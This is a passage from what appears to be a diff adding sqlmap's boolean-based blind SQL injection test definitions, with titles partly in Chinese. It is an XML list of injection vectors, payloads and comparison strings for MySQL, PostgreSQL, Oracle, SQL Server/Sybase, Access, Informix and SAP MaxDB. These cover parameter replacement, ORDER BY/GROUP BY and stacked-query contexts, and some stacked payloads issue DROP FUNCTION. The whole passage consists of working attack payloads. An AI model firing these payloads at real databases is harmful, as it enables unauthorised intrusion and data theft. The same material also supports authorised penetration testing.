+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+            <os>Windows</os>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle 基于布尔的盲注 - 参数替换</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</vector>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</comparison>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle 基于布尔的盲注 - 参数替换 (原始值)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</vector>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</comparison>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Informix 基于布尔的盲注 - 参数替换</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)</vector>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)</comparison>
+        </response>
+        <details>
+            <dbms>Informix</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Informix 基于布尔的盲注 - 参数替换 (原始值)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL)</vector>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL)</payload>
+        </request>
+        <response>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL)</comparison>
+        </response>
+        <details>
+            <dbms>Informix</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft Access 基于布尔的盲注 - 参数替换</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>IIF([INFERENCE],[RANDNUM],1/0)</vector>
+        <request>
+            <payload>IIF([RANDNUM]=[RANDNUM],[RANDNUM],1/0)</payload>
+        </request>
+        <response>
+            <comparison>IIF([RANDNUM]=[RANDNUM1],[RANDNUM],1/0)</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft Access</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft Access 基于布尔的盲注 - 参数替换 (原始值)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>IIF([INFERENCE],[ORIGVALUE],1/0)</vector>
+        <request>
+            <payload>IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)</payload>
+        </request>
+        <response>
+            <comparison>IIF([RANDNUM]=[RANDNUM1],[ORIGVALUE],1/0)</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft Access</dbms>
+        </details>
+    </test>
+
+    <!-- Works in MySQL, Oracle, etc. -->
+    <test>
+        <title>基于布尔的盲注 - 参数替换 (DUAL)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)</vector>
+        <request>
+            <payload>(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)</payload>
+        </request>
+        <response>
+            <comparison>(CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>基于布尔的盲注 - 参数替换 (DUAL) (原始值)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)</vector>
+        <request>
+            <payload>(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)</payload>
+        </request>
+        <response>
+            <comparison>(CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)</comparison>
+        </response>
+    </test>
+    <!-- 基于布尔的盲注测试结束 - 参数替换 -->
+
+    <!-- Works in SAP MaxDB, Informix, etc. -->
+    <test>
+        <title>基于布尔的盲注 - 参数替换 (CASE)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE NULL END)</vector>
+        <request>
+            <payload>(CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE NULL END)</payload>
+        </request>
+        <response>
+            <comparison>(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [RANDNUM] ELSE NULL END)</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>基于布尔的盲注 - 参数替换 (CASE) (原始值)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE NULL END)</vector>
+        <request>
+            <payload>(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)</payload>
+        </request>
+        <response>
+            <comparison>(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [ORIGVALUE] ELSE NULL END)</comparison>
+        </response>
+    </test>
+    <!-- 基于布尔的盲注测试结束 - 参数替换 -->
+
+    <!-- 基于布尔的盲注 tests - ORDER BY, GROUP BY clause -->
+    <test>
+        <title>MySQL &gt;= 5.0 基于布尔的盲注 - ORDER BY, GROUP BY clause</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</payload>
+        </request>
+        <response>
+            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0 基于布尔的盲注 - ORDER BY, GROUP BY clause (原始值)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</payload>
+        </request>
+        <response>
+            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0 基于布尔的盲注 - ORDER BY, GROUP BY clause</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</payload>
+        </request>
+        <response>
+            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0 基于布尔的盲注 - ORDER BY, GROUP BY clause (原始值)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</payload>
+        </request>
+        <response>
+            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL 基于布尔的盲注 - ORDER BY, GROUP BY clause</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE 1/(SELECT 0) END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/(SELECT 0) END))</payload>
+        </request>
+        <response>
+            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 1/(SELECT 0) END))</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <!-- It exclusively works with ORDER BY -->
+    <test>
+        <title>PostgreSQL 基于布尔的盲注 - ORDER BY clause (原始值)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))</payload>
+        </request>
+        <response>
+            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <!--
+         TODO：如果sqlmap没有使用单引号将基于字符串的[ORIGVALUE]括起来，那么它也适用于GROUP BY，但是其他有效负载将会中断。它已经适用于ORDER BY，因为它接受int，而GROUP BY只接受格式[table] [列]所以[ORIGVALUE]必须在哪里
+    -->
+    <test>
+        <!-- <title>PostgreSQL 基于布尔的盲注 - ORDER BY, GROUP BY clause (GENERATE_SERIES - 原始值)</title> -->
+        <title>PostgreSQL 基于布尔的盲注 - ORDER BY clause (GENERATE_SERIES)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <!-- <clause>2,3</clause> -->
+        <clause>3</clause>
+        <where>1</where>
+        <vector>,(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1)</vector>
+        <request>
+            <payload>,(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)</payload>
+        </request>
+        <response>
+            <comparison>,(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase 基于布尔的盲注 - ORDER BY clause</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</payload>
+        </request>
+        <response>
+            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+            <os>Windows</os>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase 基于布尔的盲注 - ORDER BY clause (原始值)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</payload>
+        </request>
+        <response>
+            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+            <os>Windows</os>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle 基于布尔的盲注 - ORDER BY, GROUP BY clause</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</payload>
+        </request>
+        <response>
+            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</comparison>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle 基于布尔的盲注 - ORDER BY, GROUP BY clause (原始值)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</payload>
+        </request>
+        <response>
+            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</comparison>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft Access 基于布尔的盲注 - ORDER BY, GROUP BY clause</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,IIF([INFERENCE],1,1/0)</vector>
+        <request>
+            <payload>,IIF([RANDNUM]=[RANDNUM],1,1/0)</payload>
+        </request>
+        <response>
+            <comparison>,IIF([RANDNUM]=[RANDNUM1],1,1/0)</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft Access</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft Access 基于布尔的盲注 - ORDER BY, GROUP BY clause (原始值)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,IIF([INFERENCE],[ORIGVALUE],1/0)</vector>
+        <request>
+            <payload>,IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)</payload>
+        </request>
+        <response>
+            <comparison>,IIF([RANDNUM]=[RANDNUM1],[ORIGVALUE],1/0)</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft Access</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SAP MaxDB 基于布尔的盲注 - ORDER BY, GROUP BY clause</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(CASE WHEN [INFERENCE] THEN 1 ELSE NULL END)</vector>
+        <request>
+            <payload>,(CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END)</payload>
+        </request>
+        <response>
+            <comparison>,(CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE NULL END)</comparison>
+        </response>
+        <details>
+            <dbms>SAP MaxDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SAP MaxDB 基于布尔的盲注 - ORDER BY, GROUP BY clause (原始值)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE NULL END)</vector>
+        <request>
+            <payload>,(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)</payload>
+        </request>
+        <response>
+            <comparison>,(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [ORIGVALUE] ELSE NULL END)</comparison>
+        </response>
+        <details>
+            <dbms>SAP MaxDB</dbms>
+        </details>
+    </test>
+    <!-- End of 基于布尔的盲注 tests - ORDER BY, GROUP BY clause -->
+
+    <!-- 基于布尔的盲注 tests - 堆叠(多语句)注入 -->
+    <test>
+        <title>MySQL &gt;= 5.0 基于布尔的盲注 - 堆叠(多语句)注入</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)</vector>
+        <request>
+            <payload>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <comparison>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0 基于布尔的盲注 - 堆叠(多语句)注入</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)</vector>
+        <request>
+            <payload>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <comparison>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL 基于布尔的盲注 - 堆叠(多语句)注入</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)</vector>
+        <request>
+            <payload>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <!-- Because of the syntax of GENERATE_SERIES() function, the 'then' condition must be 1, do not change it -->
+    <test>
+        <title>PostgreSQL 基于布尔的盲注 - 堆叠(多语句)注入 (GENERATE_SERIES)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>;SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1</vector>
+        <request>
+            <payload>;SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>;SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase 基于布尔的盲注 - 堆叠(多语句)注入 (IF)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>;IF([INFERENCE]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]</vector>
+        <request>
+            <payload>;IF([RANDNUM]=[RANDNUM]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>;IF([RANDNUM]=[RANDNUM1]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+            <os>Windows</os>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase 基于布尔的盲注 - 堆叠(多语句)注入</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)</vector>
+        <request>
+            <payload>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+            <os>Windows</os>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle 基于布尔的盲注 - 堆叠(多语句)注入</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL</vector>
+        <request>
+            <payload>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL</comparison>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft Access 基于布尔的盲注 - 堆叠(多语句)注入</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>;IIF([INFERENCE],1,1/0)</vector>
+        <request>
+            <payload>;IIF([RANDNUM]=[RANDNUM],1,1/0)</payload>
+            <comment>%16</comment>
+        </request>
+        <response>
+            <comparison>;IIF([RANDNUM]=[RANDNUM1],1,1/0)</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft Access</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SAP MaxDB 基于布尔的盲注 - 堆叠(多语句)注入</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>;SELECT CASE WHEN [INFERENCE] THEN 1 ELSE NULL END</vector>
+        <request>
+            <payload>;SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>;SELECT CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE NULL END</comparison>
+        </response>
+        <details>
+            <dbms>SAP MaxDB</dbms>
+        </details>
+    </test>
+    <!-- 基于布尔的盲注测试结束 - 堆叠(多语句)注入 -->
+</root>
